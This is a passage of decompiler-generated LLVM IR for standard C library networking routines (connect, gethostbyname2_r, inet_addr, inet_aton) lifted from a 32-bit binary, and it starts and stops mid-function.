  store i32 %arg1, i32* %stack_var_-24, align 4
  store i32 102, i32* @eax, align 4
  %v1_804b365 = call i32 @__vsyscall(i32 %arg1)
  %v1_804b36e = call i32 @__syscall_ret(i32 %v1_804b365)
  ret i32 %v1_804b36e

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804b3ab = ptrtoint i32* %stack_var_-24 to i32
  %v7_804b3bd = call i32 @__syscall_cp(i32 102, i32 3, i32 %v2_804b3ab, i32 0, i32 0, i32 0, i32 0)
  %v1_804b3c6 = call i32 @__syscall_ret(i32 %v7_804b3bd)
  ret i32 %v1_804b3c6

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %v2_804b3d9 = call i32 @gethostbyname2(i32 %arg1, i32 2)
  ret i32 %v2_804b3d9
}

define i32 @gethostbyname2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b3e4 = load i32, i32* @ebp, align 4
  %v0_804b3e5 = load i32, i32* @edi, align 4
  %v0_804b3e6 = load i32, i32* @esi, align 4
  %v0_804b3ec = load i32, i32* @ebx, align 4
  store i32 %v0_804b3ec, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v2_804b3f4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804b3f4, i32* @edi, align 4
  %v7_804b44b = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_804b3f8

dec_label_pc_804b3f8:                             ; preds = %dec_label_pc_804b42f.dec_label_pc_804b3f8_crit_edge, %entry
  %v0_804b401 = phi i32 [ %v0_804b401.pre, %dec_label_pc_804b42f.dec_label_pc_804b3f8_crit_edge ], [ 63, %entry ]
  %v0_804b3fb = load i32, i32* @global_var_8056dd0.344, align 16
  %v2_804b401 = mul i32 %v0_804b401, 2
  store i32 %v2_804b401, i32* @ebx, align 4
  %v1_804b404 = or i32 %v2_804b401, 1
  store i32 %v1_804b404, i32* @esi, align 4
  %v1_804b407 = call i32 @free(i32 %v0_804b3fb)
  %v0_804b40c = load i32, i32* @esi, align 4
  %v1_804b40f = call i32 @malloc(i32 %v0_804b40c)
  %v1_804b417 = icmp eq i32 %v1_804b40f, 0
  store i32 %v1_804b40f, i32* @global_var_8056dd0.344, align 16
  %v1_804b41e = icmp eq i1 %v1_804b417, false
  %v0_804b42f = call i32 @__h_errno_location()
  br i1 %v1_804b41e, label %dec_label_pc_804b42f, label %dec_label_pc_804b420

dec_label_pc_804b420:                             ; preds = %dec_label_pc_804b3f8
  store i32 0, i32* @edx, align 4
  %v1_804b427 = inttoptr i32 %v0_804b42f to i32*
  store i32 3, i32* %v1_804b427, align 4
  %v0_804b467.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804b464

dec_label_pc_804b42f:                             ; preds = %dec_label_pc_804b3f8
  %v0_804b434 = load i32, i32* @global_var_8056dd0.344, align 16
  %v0_804b43a = load i32, i32* @ecx, align 4
  %v0_804b43d = load i32, i32* @ebx, align 4
  %v1_804b43d = add i32 %v0_804b43d, -19
  %v1_804b441 = add i32 %v0_804b434, 20
  %v8_804b44b = call i32 @gethostbyname2_r(i8* %v7_804b44b, i32 %v0_804b434, i32 %v1_804b441, i32 %v1_804b43d, i32 %v2_804b3f4, i32 %v0_804b42f, i32 %v0_804b43a)
  store i32 %v8_804b44b, i32* @eax, align 4
  %v9_804b453 = icmp eq i32 %v8_804b44b, 34
  br i1 %v9_804b453, label %dec_label_pc_804b42f.dec_label_pc_804b3f8_crit_edge, label %dec_label_pc_804b458

dec_label_pc_804b42f.dec_label_pc_804b3f8_crit_edge: ; preds = %dec_label_pc_804b42f
  %v0_804b401.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b3f8

dec_label_pc_804b458:                             ; preds = %dec_label_pc_804b42f
  store i32 0, i32* @edx, align 4
  %v1_804b45a = icmp eq i32 %v8_804b44b, 0
  %v1_804b45c = icmp eq i1 %v1_804b45a, false
  br i1 %v1_804b45c, label %dec_label_pc_804b464, label %dec_label_pc_804b45e

dec_label_pc_804b45e:                             ; preds = %dec_label_pc_804b458
  %v0_804b45e = load i32, i32* @global_var_8056dd0.344, align 16
  store i32 %v0_804b45e, i32* @edx, align 4
  br label %dec_label_pc_804b464

dec_label_pc_804b464:                             ; preds = %dec_label_pc_804b458, %dec_label_pc_804b420, %dec_label_pc_804b45e
  %v0_804b467 = phi i32 [ 0, %dec_label_pc_804b458 ], [ %v0_804b467.pre, %dec_label_pc_804b420 ], [ %v0_804b45e, %dec_label_pc_804b45e ]
  %v2_804b469 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b469, i32* @ebx, align 4
  store i32 %v0_804b3e6, i32* @esi, align 4
  store i32 %v0_804b3e5, i32* @edi, align 4
  store i32 %v0_804b3e4, i32* @ebp, align 4
  ret i32 %v0_804b467

; uselistorder directives
  uselistorder i32 %v8_804b44b, { 1, 0, 2 }
  uselistorder i32 %v0_804b42f, { 1, 0 }
  uselistorder i32 %v2_804b401, { 1, 0 }
  uselistorder label %dec_label_pc_804b464, { 2, 0, 1 }
}

define i32 @gethostbyname2_r(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_4, align 4
  %stack_var_-1616 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-1640 = alloca i8*, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b470 = load i32, i32* @ebp, align 4
  %v0_804b471 = load i32, i32* @edi, align 4
  %v0_804b472 = load i32, i32* @esi, align 4
  %v0_804b473 = load i32, i32* @ebx, align 4
  store i32 %v0_804b473, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg7, i32* @ebx, align 4
  %v1_804b496 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v1_804b496, align 4
  %v0_804b49e = load i32, i32* @esi, align 4
  %tmp34 = bitcast i8** %stack_var_4 to i32*
  %v3_804b49f4 = load i32, i32* %tmp34, align 4
  %v2_804b4a6 = ptrtoint i32* %stack_var_-272 to i32
  %v2_804b4ae = ptrtoint i32* %stack_var_-1616 to i32
  store i32 %v2_804b4ae, i32* %eax.global-to-local, align 4
  %v7_804b4b3 = bitcast i32* %stack_var_-1616 to i8*
  %v8_804b4b3 = call i32 @__lookup_name(i8* %v7_804b4b3, i32 %v2_804b4a6, i32 %v3_804b49f4, i32 %v0_804b49e, i32 2)
  store i32 %v8_804b4b3, i32* %eax.global-to-local, align 4
  %v2_804b4bf = icmp slt i32 %v8_804b4b3, 0
  %v1_804b4c1 = icmp eq i1 %v2_804b4bf, false
  br i1 %v1_804b4c1, label %dec_label_pc_804b518, label %dec_label_pc_804b4c3

dec_label_pc_804b4c3:                             ; preds = %entry
  %v1_804b4c7 = add i32 %v8_804b4b3, 11
  store i32 %v1_804b4c7, i32* %eax.global-to-local, align 4
  switch i32 %v8_804b4b3, label %dec_label_pc_804b4f6 [
    i32 -11, label %dec_label_pc_804b506
    i32 -10, label %dec_label_pc_804b506
    i32 -3, label %dec_label_pc_804b4e6
    i32 -2, label %dec_label_pc_804b4d6
    i32 0, label %dec_label_pc_804b518
  ]

dec_label_pc_804b4d6:                             ; preds = %dec_label_pc_804b4c3
  store i32 2, i32* %eax.global-to-local, align 4
  %v0_804b4db = load i32, i32* @ebx, align 4
  %v1_804b4db = inttoptr i32 %v0_804b4db to i32*
  store i32 1, i32* %v1_804b4db, align 4
  br label %dec_label_pc_804b660

dec_label_pc_804b4e6:                             ; preds = %dec_label_pc_804b4c3
  store i32 11, i32* %eax.global-to-local, align 4
  %v0_804b4eb = load i32, i32* @ebx, align 4
  %v1_804b4eb = inttoptr i32 %v0_804b4eb to i32*
  store i32 2, i32* %v1_804b4eb, align 4
  br label %dec_label_pc_804b660

dec_label_pc_804b4f6:                             ; preds = %dec_label_pc_804b4c3
  store i32 74, i32* %eax.global-to-local, align 4
  %v0_804b4fb = load i32, i32* @ebx, align 4
  %v1_804b4fb = inttoptr i32 %v0_804b4fb to i32*
  store i32 3, i32* %v1_804b4fb, align 4
  br label %dec_label_pc_804b660

dec_label_pc_804b506:                             ; preds = %dec_label_pc_804b4c3, %dec_label_pc_804b4c3
  %v0_804b506 = load i32, i32* @ebx, align 4
  %v1_804b506 = inttoptr i32 %v0_804b506 to i32*
  store i32 3, i32* %v1_804b506, align 4
  %v1_804b50c = call i32 @__errno_location(i32 %v8_804b4b3)
  store i32 %v1_804b50c, i32* %eax.global-to-local, align 4
  %v1_804b511 = inttoptr i32 %v1_804b50c to i32*
  %v2_804b511 = load i32, i32* %v1_804b511, align 4
  store i32 %v2_804b511, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b660

dec_label_pc_804b518:                             ; preds = %entry, %dec_label_pc_804b4c3
  %v0_804b51e = load i32, i32* @esi, align 4
  %v9_804b51e = icmp eq i32 %v0_804b51e, 10
  %v1_804b52f = add i32 %v8_804b4b3, 1
  store i32 %v1_804b52f, i32* @ecx, align 4
  %v1_804b530 = select i1 %v9_804b51e, i32 16, i32 4
  store i32 %v1_804b530, i32* %ebx.global-to-local, align 4
  %v1_804b53a = sub i32 0, %arg4
  store i32 %v1_804b53a, i32* %edi.global-to-local, align 4
  %v1_804b53c = load i32, i32* @ebp, align 4
  %v2_804b53c = add i32 %v1_804b53c, 8
  %v3_804b53c = inttoptr i32 %v2_804b53c to i32*
  store i32 %v0_804b51e, i32* %v3_804b53c, align 4
  %v0_804b53f = load i32, i32* %edi.global-to-local, align 4
  %v1_804b53f = urem i32 %v0_804b53f, 4
  store i32 %v1_804b53f, i32* %edi.global-to-local, align 4
  %v0_804b542 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b542 = load i32, i32* @ebp, align 4
  %v2_804b542 = add i32 %v1_804b542, 12
  %v3_804b542 = inttoptr i32 %v2_804b542 to i32*
  store i32 %v0_804b542, i32* %v3_804b542, align 4
  %v0_804b545 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b545 = add i32 %v0_804b545, 4
  store i32 %v1_804b545, i32* %ebx.global-to-local, align 4
  %v3_804b5485 = load i32, i32* %tmp34, align 4
  %v0_804b54f.cast = inttoptr i32 %v3_804b5485 to i8*
  %v3_804b54f = call i32 @strlen(i8* %v0_804b54f.cast)
  store i32 %v3_804b54f, i32* @esi, align 4
  store i32 %v2_804b4a6, i32* %eax.global-to-local, align 4
  %tmp36 = bitcast i32* %stack_var_-272 to i8*
  %v3_804b55f = call i32 @strlen(i8* %tmp36)
  %v0_804b564 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b564 = load i32, i32* @esi, align 4
  %v0_804b568 = load i32, i32* %ebx.global-to-local, align 4
  %v8_804b568 = mul i32 %v0_804b568, %v1_804b52f
  store i32 %v8_804b568, i32* %ebx.global-to-local, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  %v2_804b564 = add i32 %v3_804b55f, 18
  %v3_804b564 = add i32 %v2_804b564, %v0_804b564
  %v2_804b570 = add i32 %v3_804b564, %v1_804b564
  %v2_804b577 = add i32 %v2_804b570, %v8_804b568
  store i32 %v2_804b577, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v2_804b577, %arg5
  br i1 %tmp, label %dec_label_pc_804b660, label %dec_label_pc_804b586

dec_label_pc_804b586:                             ; preds = %dec_label_pc_804b518
  store i32 %v1_804b52f, i32* %ecx.global-to-local, align 4
  %v2_804b591 = add i32 %v0_804b564, %arg4
  store i32 %v2_804b591, i32* %eax.global-to-local, align 4
  %v1_804b593 = add i32 %v2_804b591, 12
  store i32 %v1_804b593, i32* %edx.global-to-local, align 4
  %v2_804b596 = mul i32 %v1_804b52f, 4
  %v3_804b596 = add i32 %v1_804b593, %v2_804b596
  store i32 %v3_804b596, i32* @ebx, align 4
  %v2_804b599 = inttoptr i32 %v2_804b591 to i32*
  store i32 %v3_804b596, i32* %v2_804b599, align 4
  %v0_804b59b = load i32, i32* %edx.global-to-local, align 4
  %v1_804b59b = load i32, i32* @ebp, align 4
  %v2_804b59b = add i32 %v1_804b59b, 16
  %v3_804b59b = inttoptr i32 %v2_804b59b to i32*
  store i32 %v0_804b59b, i32* %v3_804b59b, align 4
  %v0_804b59e = load i32, i32* %eax.global-to-local, align 4
  %v1_804b59e = load i32, i32* @ebp, align 4
  %v2_804b59e = add i32 %v1_804b59e, 4
  %v3_804b59e = inttoptr i32 %v2_804b59e to i32*
  store i32 %v0_804b59e, i32* %v3_804b59e, align 4
  %v0_804b5a1 = load i32, i32* @ebx, align 4
  %v1_804b5a1 = load i32, i32* @ebp, align 4
  %v2_804b5a1 = inttoptr i32 %v1_804b5a1 to i32*
  store i32 %v0_804b5a1, i32* %v2_804b5a1, align 4
  store i32 %v2_804b4a6, i32* %eax.global-to-local, align 4
  store i8* %tmp36, i8** %stack_var_-1640, align 4
  %v0_804b5ae = load i32, i32* @ebx, align 4
  %v4_804b5af = call i32 @strcpy(i32 %v0_804b5ae, i32 %v2_804b4a6)
  store i32 %v4_804b5af, i32* %eax.global-to-local, align 4
  %v0_804b5b5 = load i32, i32* @ebp, align 4
  %v1_804b5b5 = inttoptr i32 %v0_804b5b5 to i32*
  %v2_804b5b5 = load i32, i32* %v1_804b5b5, align 4
  %v7_804b5b5 = inttoptr i32 %v2_804b5b5 to i8*
  %v3_804b5b8 = call i32 @strlen(i8* %v7_804b5b5)
  store i32 %v3_804b5b8, i32* %eax.global-to-local, align 4
  store i32 %v2_804b5b5, i32* %ecx.global-to-local, align 4
  %v0_804b5be = load i32, i32* @ebx, align 4
  %v2_804b5be = add i32 %v3_804b5b8, 1
  %v3_804b5be = add i32 %v2_804b5be, %v0_804b5be
  store i32 %v3_804b5be, i32* @esi, align 4
  %v2_804b5c2 = load i8*, i8** %stack_var_-1640, align 4
  %v3_804b5c2 = ptrtoint i8* %v2_804b5c2 to i32
  store i32 %v3_804b5c2, i32* @ebx, align 4
  %v3_804b5c36 = load i32, i32* %tmp34, align 4
  %tmp37 = bitcast i8** %stack_var_-1640 to i32*
  store i32 %v3_804b5c36, i32* %tmp37, align 4
  %v0_804b5ca = load i32, i32* @ebp, align 4
  %v1_804b5ca = inttoptr i32 %v0_804b5ca to i32*
  %v2_804b5ca = load i32, i32* %v1_804b5ca, align 4
  %v7_804b5ca = inttoptr i32 %v2_804b5ca to i8*
  %tmp38 = inttoptr i32 %v3_804b5c36 to i8*
  %v6_804b5cd = call i32 @strcmp(i8* %v7_804b5ca, i8* %tmp38)
  store i32 %v6_804b5cd, i32* %eax.global-to-local, align 4
  %v1_804b5d5 = icmp eq i32 %v6_804b5cd, 0
  %v0_804b5d7 = load i32, i32* @ebp, align 4
  %v1_804b5d7 = add i32 %v0_804b5d7, 4
  %v2_804b5d7 = inttoptr i32 %v1_804b5d7 to i32*
  %v3_804b5d7 = load i32, i32* %v2_804b5d7, align 4
  store i32 %v3_804b5d7, i32* %eax.global-to-local, align 4
  br i1 %v1_804b5d5, label %dec_label_pc_804b605, label %dec_label_pc_804b5dc

dec_label_pc_804b5dc:                             ; preds = %dec_label_pc_804b586
  %v0_804b5dc = load i32, i32* @esi, align 4
  %v2_804b5dc = add i32 %v3_804b5d7, 4
  %v3_804b5dc = inttoptr i32 %v2_804b5dc to i32*
  store i32 %v0_804b5dc, i32* %v3_804b5dc, align 4
  %v3_804b5e17 = load i32, i32* %tmp34, align 4
  store i32 %v3_804b5e17, i32* %tmp37, align 4
  %v0_804b5e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b5e8 = add i32 %v0_804b5e8, 4
  %v2_804b5e8 = inttoptr i32 %v1_804b5e8 to i32*
  %v3_804b5e8 = load i32, i32* %v2_804b5e8, align 4
  %v4_804b5eb = call i32 @strcpy(i32 %v3_804b5e8, i32 %v3_804b5e17)
  store i32 %v3_804b5e8, i32* %eax.global-to-local, align 4
  %v0_804b5f1 = load i32, i32* @ebp, align 4
  %v1_804b5f1 = add i32 %v0_804b5f1, 4
  %v2_804b5f1 = inttoptr i32 %v1_804b5f1 to i32*
  %v3_804b5f1 = load i32, i32* %v2_804b5f1, align 4
  store i32 %v3_804b5f1, i32* %eax.global-to-local, align 4
  %v1_804b5f4 = add i32 %v3_804b5f1, 4
  %v2_804b5f4 = inttoptr i32 %v1_804b5f4 to i32*
  %v3_804b5f4 = load i32, i32* %v2_804b5f4, align 4
  %v8_804b5f4 = inttoptr i32 %v3_804b5f4 to i8*
  %v3_804b5f7 = call i32 @strlen(i8* %v8_804b5f4)
  store i32 %v3_804b5f7, i32* %eax.global-to-local, align 4
  %v0_804b5ff = load i32, i32* @esi, align 4
  %v2_804b5ff = add i32 %v3_804b5f7, 1
  %v3_804b5ff = add i32 %v2_804b5ff, %v0_804b5ff
  store i32 %v3_804b5ff, i32* @esi, align 4
  br label %dec_label_pc_804b60c

dec_label_pc_804b605:                             ; preds = %dec_label_pc_804b586
  %v1_804b605 = add i32 %v3_804b5d7, 4
  %v2_804b605 = inttoptr i32 %v1_804b605 to i32*
  store i32 0, i32* %v2_804b605, align 4
  br label %dec_label_pc_804b60c

dec_label_pc_804b60c:                             ; preds = %dec_label_pc_804b5dc, %dec_label_pc_804b605
  %v0_804b60c = load i32, i32* @ebp, align 4
  %v1_804b60c = add i32 %v0_804b60c, 4
  %v2_804b60c = inttoptr i32 %v1_804b60c to i32*
  %v3_804b60c = load i32, i32* %v2_804b60c, align 4
  store i32 %v3_804b60c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %v2_804b4ae, i32* @edi, align 4
  %v1_804b615 = add i32 %v3_804b60c, 8
  %v2_804b615 = inttoptr i32 %v1_804b615 to i32*
  store i32 0, i32* %v2_804b615, align 4
  br label %dec_label_pc_804b645

dec_label_pc_804b61e:                             ; preds = %dec_label_pc_804b645
  %v1_804b61e = add i32 %v0_804b649, 12
  %v2_804b61e = inttoptr i32 %v1_804b61e to i32*
  %v3_804b61e = load i32, i32* %v2_804b61e, align 4
  store i32 %v3_804b61e, i32* %eax.global-to-local, align 4
  %v1_804b624 = mul i32 %v0_804b645, 4
  store i32 %v1_804b624, i32* %edx.global-to-local, align 4
  %v0_804b62b = load i32, i32* @esi, align 4
  %v3_804b62b = add i32 %v3_804b649, %v1_804b624
  %v4_804b62b = inttoptr i32 %v3_804b62b to i32*
  store i32 %v0_804b62b, i32* %v4_804b62b, align 4
  %v0_804b62e = load i32, i32* %eax.global-to-local, align 4
  %v0_804b62f = load i32, i32* @esi, align 4
  %v2_804b62f = add i32 %v0_804b62f, %v0_804b62e
  store i32 %v2_804b62f, i32* @esi, align 4
  %v1_804b631 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804b631 = mul i32 %v1_804b631, 28
  %v1_804b634 = add i32 %v1_804b631, 1
  store i32 %v1_804b634, i32* %ebx.global-to-local, align 4
  %v1_804b635 = load i32, i32* @edi, align 4
  %v2_804b635 = add i32 %v3_804b631, 8
  %v3_804b635 = add i32 %v2_804b635, %v1_804b635
  store i32 %v3_804b635, i32* %eax.global-to-local, align 4
  %v5_804b639 = inttoptr i32 %v3_804b635 to i8*
  store i8* %v5_804b639, i8** %stack_var_-1640, align 4
  %v0_804b63a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b63a = load i32, i32* %edx.global-to-local, align 4
  %v2_804b63a = add i32 %v1_804b63a, %v0_804b63a
  %v3_804b63a = inttoptr i32 %v2_804b63a to i32*
  %v4_804b63a = load i32, i32* %v3_804b63a, align 4
  %v9_804b63a = inttoptr i32 %v4_804b63a to i8*
  %v6_804b63d = call i32 @memcpy(i8* %v9_804b63a, i32 %v3_804b635, i32 %v0_804b62e)
  store i32 %v6_804b63d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b645

dec_label_pc_804b645:                             ; preds = %dec_label_pc_804b60c, %dec_label_pc_804b61e
  %v0_804b645 = load i32, i32* %ebx.global-to-local, align 4
  %v0_804b649 = load i32, i32* @ebp, align 4
  %v1_804b649 = add i32 %v0_804b649, 16
  %v2_804b649 = inttoptr i32 %v1_804b649 to i32*
  %v3_804b649 = load i32, i32* %v2_804b649, align 4
  store i32 %v3_804b649, i32* %ecx.global-to-local, align 4
  %v5_804b64c = icmp slt i32 %v0_804b645, %v8_804b4b3
  br i1 %v5_804b64c, label %dec_label_pc_804b61e, label %dec_label_pc_804b64e

dec_label_pc_804b64e:                             ; preds = %dec_label_pc_804b645
  %v2_804b64e = mul i32 %v0_804b645, 4
  %v3_804b64e = add i32 %v3_804b649, %v2_804b64e
  %v4_804b64e = inttoptr i32 %v3_804b64e to i32*
  store i32 0, i32* %v4_804b64e, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b65e = load i32, i32* @ebp, align 4
  store i32 %v0_804b65e, i32* %v1_804b496, align 4
  br label %dec_label_pc_804b660

dec_label_pc_804b660:                             ; preds = %dec_label_pc_804b518, %dec_label_pc_804b506, %dec_label_pc_804b4e6, %dec_label_pc_804b4d6, %dec_label_pc_804b4f6, %dec_label_pc_804b64e
  %v2_804b666 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b666, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b472, i32* @esi, align 4
  store i32 %v0_804b471, i32* @edi, align 4
  store i32 %v0_804b470, i32* @ebp, align 4
  %v0_804b66a = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804b66a

; uselistorder directives
  uselistorder i32 %v3_804b649, { 0, 2, 1 }
  uselistorder i32 %v0_804b649, { 1, 0 }
  uselistorder i32 %v0_804b645, { 0, 2, 1 }
  uselistorder i32 %v1_804b631, { 1, 0 }
  uselistorder i32 %v0_804b62e, { 1, 0 }
  uselistorder i32 %v3_804b5d7, { 1, 0, 2 }
  uselistorder i32 %v1_804b52f, { 1, 2, 0, 3 }
  uselistorder i32 %v8_804b4b3, { 4, 0, 2, 1, 3, 5, 6 }
  uselistorder i32 %v2_804b4a6, { 1, 2, 3, 0 }
  uselistorder i8** %stack_var_-1640, { 3, 0, 2, 1 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %ebx.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 21, 1, 27, 23, 24, 25 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_804b660, { 5, 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_804b645, { 1, 0 }
  uselistorder label %dec_label_pc_804b60c, { 1, 0 }
  uselistorder label %dec_label_pc_804b518, { 1, 0 }
}

define i32 @__h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8056fb8.346 to i32)
}

define i32 @htons(i16 %arg1) local_unnamed_addr {
entry:
  %v3_804b678 = call i16 @llvm.bswap.i16(i16 %arg1)
  %v4_804b678 = zext i16 %v3_804b678 to i32
  ret i32 %v4_804b678
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_804b683 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804b68c = inttoptr i32 %arg1 to i8*
  %v3_804b68c = call i32 @__inet_aton(i8* %v2_804b68c, i32 %v2_804b683)
  %v1_804b697 = icmp eq i32 %v3_804b68c, 0
  br i1 %v1_804b697, label %dec_label_pc_804b69f, label %dec_label_pc_804b69b

dec_label_pc_804b69b:                             ; preds = %entry
  %v3_804b69b = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804b69f

dec_label_pc_804b69f:                             ; preds = %entry, %dec_label_pc_804b69b
  %v0_804b69f = phi i32 [ -1, %entry ], [ %v3_804b69b, %dec_label_pc_804b69b ]
  ret i32 %v0_804b69f

; uselistorder directives
  uselistorder label %dec_label_pc_804b69f, { 1, 0 }
}

define i32 @__inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = call i8 @__decompiler_undefined_function_4()
  %tmp12 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804b6a8 = load i32, i32* @ebp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804b6ab = load i32, i32* @edi, align 4
  %v0_804b6ac = load i32, i32* @esi, align 4
  %v0_804b6ad = load i32, i32* @ebx, align 4
  store i32 %v0_804b6ad, i32* %stack_var_-16, align 4
  store i32 0, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  %v2_804b6b4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 0, i32* %stack_var_-36, align 4
  %v6_804b6b8 = add i32 %v2_804b6b4, 4
  store i32 %v6_804b6b8, i32* %edi.global-to-local, align 4
  store i32 %v2_804b6b4, i32* @ebp, align 4
  %v2_804b6bd = inttoptr i32 %v6_804b6b8 to i32*
  store i32 0, i32* %v2_804b6bd, align 4
  %v3_804b6bd = load i32, i32* %edi.global-to-local, align 4
  %v6_804b6bd = add i32 %v3_804b6bd, 4
  store i32 %v6_804b6bd, i32* %edi.global-to-local, align 4
  %v0_804b6be = load i32, i32* %eax.global-to-local, align 4
  %v2_804b6be = inttoptr i32 %v6_804b6bd to i32*
  store i32 %v0_804b6be, i32* %v2_804b6be, align 4
  %v3_804b6be = load i32, i32* %edi.global-to-local, align 4
  %v6_804b6be = add i32 %v3_804b6be, 4
  store i32 %v6_804b6be, i32* %edi.global-to-local, align 4
  %v0_804b6bf = load i32, i32* %eax.global-to-local, align 4
  %v2_804b6bf = inttoptr i32 %v6_804b6be to i32*
  store i32 %v0_804b6bf, i32* %v2_804b6bf, align 4
  %v3_804b6bf = load i32, i32* %edi.global-to-local, align 4
  %v6_804b6bf = add i32 %v3_804b6bf, 4
  store i32 %v6_804b6bf, i32* %edi.global-to-local, align 4
  %v4_804b6c0 = ptrtoint i8* %arg1 to i32
  %v2_804b6c7 = ptrtoint i8** %stack_var_-20 to i32
  br label %dec_label_pc_804b6c4

dec_label_pc_804b6c4:                             ; preds = %dec_label_pc_804b71f, %entry
  %storemerge = phi i32 [ %v4_804b6c0, %entry ], [ %v1_804b71f, %dec_label_pc_804b71f ]
  store i32 %storemerge, i32* @edi, align 4
  %v0_804b6c4 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_804b6c7, i32* %eax.global-to-local, align 4
  %v5_804b6cd = call i32 @strtoul(i32 %storemerge, i32 %v2_804b6c7, i32 0, i32 %v0_804b6c4)
  store i32 %v5_804b6cd, i32* %eax.global-to-local, align 4
  %v3_804b6d2 = load i8*, i8** %stack_var_-20, align 4
  %v4_804b6d2 = ptrtoint i8* %v3_804b6d2 to i32
  store i32 %v4_804b6d2, i32* @ecx, align 4
  %v1_804b6d9 = load i32, i32* @edi, align 4
  %v12_804b6d9 = icmp eq i32 %v4_804b6d2, %v1_804b6d9
  store i32 %v5_804b6cd, i32* @esi, align 4
  br i1 %v12_804b6d9, label %dec_label_pc_804b788, label %dec_label_pc_804b6e3

dec_label_pc_804b6e3:                             ; preds = %dec_label_pc_804b6c4
  %v2_804b6e3 = load i8, i8* %v3_804b6d2, align 1
  %v3_804b6e3 = zext i8 %v2_804b6e3 to i32
  %v4_804b6e3 = load i32, i32* @edx, align 4
  %v5_804b6e3 = and i32 %v4_804b6e3, -256
  %v6_804b6e3 = or i32 %v5_804b6e3, %v3_804b6e3
  store i32 %v6_804b6e3, i32* %edx.global-to-local, align 4
  %v4_804b6e5 = icmp eq i8 %v2_804b6e3, 0
  br i1 %v4_804b6e5, label %dec_label_pc_804b6f2, label %dec_label_pc_804b6e9

dec_label_pc_804b6e9:                             ; preds = %dec_label_pc_804b6e3
  %v10_804b6e9 = icmp eq i8 %v2_804b6e3, 46
  %v1_804b6ec = icmp eq i1 %v10_804b6e9, false
  br i1 %v1_804b6ec, label %dec_label_pc_804b788, label %dec_label_pc_804b6f2

dec_label_pc_804b6f2:                             ; preds = %dec_label_pc_804b6e9, %dec_label_pc_804b6e3
  %v1_804b6f2 = inttoptr i32 %v1_804b6d9 to i8*
  %v2_804b6f2 = load i8, i8* %v1_804b6f2, align 1
  %v3_804b6f2 = sext i8 %v2_804b6f2 to i32
  %v1_804b6f5 = add nsw i32 %v3_804b6f2, -48
  store i32 %v1_804b6f5, i32* %eax.global-to-local, align 4
  %v6_804b6fb = icmp ugt i32 %v1_804b6f5, 9
  br i1 %v6_804b6fb, label %dec_label_pc_804b788, label %dec_label_pc_804b701

dec_label_pc_804b701:                             ; preds = %dec_label_pc_804b6f2
  %v1_804b703 = load i32, i32* @ebp, align 4
  %v2_804b703 = load i32, i32* @ebx, align 4
  %v3_804b703 = mul i32 %v2_804b703, 4
